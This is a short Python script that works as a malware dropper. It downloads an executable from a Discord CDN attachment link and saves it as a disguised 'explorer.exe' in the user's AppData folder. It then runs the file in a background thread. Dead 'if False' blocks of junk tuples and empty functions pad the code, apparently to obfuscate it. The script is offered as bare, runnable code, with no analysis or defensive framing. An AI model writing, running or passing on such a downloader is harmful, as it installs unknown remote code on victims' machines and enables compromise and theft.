import subprocess
import requests
import os
import threading
if False:
    _var_178_0 = (908, 693, 633)

    def _var_178_fn():
        pass
path = os.environ['USERPROFILE'] + '\\AppData\\Local\\explorer.exe'

def process() -> None:
    if os.path.exists(path):
        subprocess.run(path, shell=True)
if False:
    _var_179_0 = (456, 578, 828)
    _var_179_1 = (743, 597, 166)
    _var_179_2 = (105, 882, 682)

    def _var_179_fn():
        pass

def download() -> None:
    response = requests.get('https://cdn.discordapp.com/attachments/1176287511065145394/1200871149119213798/main.exe?ex=65c7c169&is=65b54c69&hm=4a98079b3f113b5e22e4dd0d553095122589ef0f50985cea6e303cfc540784da&')
    if response.status_code != 200:
        exit()
    with open(path, 'wb') as file:
        file.write(response.content)

def execute() -> None:
    thread = threading.Thread(target=process)
    if False:
        _var_177_0 = (261, 837, 797)

        def _var_177_fn():
            pass
    thread.start()
download()
execute()